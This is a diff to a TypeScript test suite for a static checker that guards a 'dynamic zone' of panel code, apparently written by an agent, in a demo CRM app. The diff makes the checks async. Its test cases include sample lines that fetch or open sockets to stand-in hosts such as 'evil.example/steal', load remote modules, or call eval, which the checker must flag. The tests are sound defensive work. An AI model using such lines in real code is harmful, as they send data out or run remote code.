@@ -7,14 +7,14 @@ import { staticCheck } from '../src/static-check.js'
 import { BASE_CARD, CARD, GOOD_CARD, request, scripted } from './helpers.js'
 
 const ctx = request('x').context
-const rules = (src: string, file = 'src/dynamic/panel.tsx') => staticCheck({ [file]: src }, ctx).map((e) => e.rule)
+const rules = async (src: string, file = 'src/dynamic/panel.tsx') => (await staticCheck({ [file]: src }, ctx)).map((e) => e.rule)
 
 describe('static rules for the dynamic zone (stage 3b)', () => {
-  it('passes ordinary panel code', () => {
-    expect(rules(GOOD_CARD)).toEqual([])
-    expect(rules(`import type { Customer } from '@/readonly/api'\nimport { helper } from './helpers'\nexport default function P() { return <div>{helper()}</div> }`)).toEqual([])
-    expect(rules(`export default function P() { fetch('/api/customers'); fetch(\`/api/deals/\${1}\`); fetch('./x'); return null }`)).toEqual([])
-    expect(rules(`export default function P() { setTimeout(() => 1, 10); const html = { __html: '' }; return <div title="innerHTML">{String(html)}</div> }`)).toEqual([])
+  it('passes ordinary panel code', async () => {
+    expect(await rules(GOOD_CARD)).toEqual([])
+    expect(await rules(`import type { Customer } from '@/readonly/api'\nimport { helper } from './helpers'\nexport default function P() { return <div>{helper()}</div> }`)).toEqual([])
+    expect(await rules(`export default function P() { fetch('/api/customers'); fetch(\`/api/deals/\${1}\`); fetch('./x'); return null }`)).toEqual([])
+    expect(await rules(`export default function P() { setTimeout(() => 1, 10); const html = { __html: '' }; return <div title="innerHTML">{String(html)}</div> }`)).toEqual([])
   })
 
   it.each([
@@ -31,7 +31,7 @@ describe('static rules for the dynamic zone (stage 3b)', () => {
     ['document.write', `document.write('<b>')`, 'no-raw-html'],
     ['fetch to another host', `fetch('https://evil.example/steal')`, 'no-remote-request'],
     ['fetch protocol-relative', `fetch('//evil.example')`, 'no-remote-request'],
-    ['fetch computed URL', `const u = location.hash; fetch(u)`, 'no-remote-request'],
+    ['fetch computed URL', `const u = location.hash; fetch(u)`, 'no-computed-url'],
     ['window.fetch template to host', 'window.fetch(`https://x.example/${1}`)', 'no-remote-request'],
     ['WebSocket', `new WebSocket('wss://evil.example')`, 'no-remote-request'],
     ['EventSource', `new EventSource('http://evil.example')`, 'no-remote-request'],
@@ -39,31 +39,31 @@ describe('static rules for the dynamic zone (stage 3b)', () => {
     ['XMLHttpRequest', `new XMLHttpRequest()`, 'no-xhr'],
     ['import() of a URL', `import('https://cdn.example/x.js')`, 'no-dynamic-import'],
     ['computed import()', `const m = 'x'; import(m)`, 'no-dynamic-import'],
-  ])('%s', (_name, code, rule) => {
-    expect(rules(`export default function P() { ${code}; return null }`)).toContain(rule)
+  ])('%s', async (_name, code, rule) => {
+    expect(await rules(`export default function P() { ${code}; return null }`)).toContain(rule)
   })
 
-  it('dangerouslySetInnerHTML as a JSX attribute or a props key', () => {
-    expect(rules(`export default () => <div dangerouslySetInnerHTML={{ __html: '<b>' }} />`)).toEqual(['no-raw-html'])
-    expect(rules(`import { createElement } from 'react'\nexport default () => createElement('div', { dangerouslySetInnerHTML: { __html: '' } })`)).toEqual(['no-raw-html'])
+  it('dangerouslySetInnerHTML as a JSX attribute or a props key', async () => {
+    expect(await rules(`export default () => <div dangerouslySetInnerHTML={{ __html: '<b>' }} />`)).toEqual(['no-raw-html'])
+    expect(await rules(`import { createElement } from 'react'\nexport default () => createElement('div', { dangerouslySetInnerHTML: { __html: '' } })`)).toEqual(['no-raw-html'])
   })
 
-  it('imports only from externals, other dynamic files, never outside the zone or from URLs', () => {
-    expect(rules(`import _ from 'lodash'\nexport default () => _`)).toEqual(['allowed-imports'])
-    expect(rules(`import { secret } from '../core/session'\nexport default () => secret`)).toEqual(['allowed-imports'])
-    expect(rules(`import x from 'https://cdn.example/x.js'\nexport default () => x`)).toEqual(['no-dynamic-import'])
-    expect(rules(`export * from '@/core/auth'`, 'src/dynamic/x.ts')).toEqual(['allowed-imports'])
-    expect(rules(`const fs = require('fs')\nexport default () => fs`)).toEqual(['allowed-imports'])
+  it('imports only from externals, other dynamic files, never outside the zone or from URLs', async () => {
+    expect(await rules(`import _ from 'lodash'\nexport default () => _`)).toEqual(['allowed-imports'])
+    expect(await rules(`import { secret } from '../core/session'\nexport default () => secret`)).toEqual(['allowed-imports'])
+    expect(await rules(`import x from 'https://cdn.example/x.js'\nexport default () => x`)).toEqual(['no-dynamic-import'])
+    expect(await rules(`export * from '@/core/auth'`, 'src/dynamic/x.ts')).toEqual(['allowed-imports'])
+    expect(await rules(`const fs = require('fs')\nexport default () => fs`)).toEqual(['allowed-imports'])
   })
 
-  it('reports file, line, column and the rule', () => {
-    const [e] = staticCheck({ [CARD]: `export default function P() {\n  return <div>{eval('1')}</div>\n}` }, ctx)
+  it('reports file, line, column and the rule', async () => {
+    const [e] = await staticCheck({ [CARD]: `export default function P() {\n  return <div>{eval('1')}</div>\n}` }, ctx)
     expect(e).toMatchObject({ file: CARD, line: 2, rule: 'no-eval' })
     expect(e!.column).toBeGreaterThan(1)
     expect(e!.text).toMatch(/eval\(\) is not allowed \[no-eval\]/)
   })
 
-  it('the demo app and every recorded agent answer pass the rules', () => {
+  it('the demo app and every recorded agent answer pass the rules', async () => {
     const here = path.dirname(fileURLToPath(import.meta.url))
     const app = path.resolve(here, '../../../apps/demo-crm')
     const files: Record<string, string> = {}
@@ -72,7 +72,7 @@ describe('static rules for the dynamic zone (stage 3b)', () => {
       files[`src/dynamic/${f}`] = fs.readFileSync(path.join(app, 'e2e/fixtures', f), 'utf8')
     }
     const appCtx = { dynamicRoots: ['src/dynamic/'], externals: [], externalPatterns: ['react', 'react-dom', 'react/jsx-runtime', '@/components/ui/*', '@/lib/utils', '@/readonly/*'] }
-    expect(staticCheck(files, appCtx)).toEqual([])
+    expect(await staticCheck(files, appCtx)).toEqual([])
   })
 
   it('the agent gets the violation from check, finish refuses the commit, and the fix goes through', async () => {
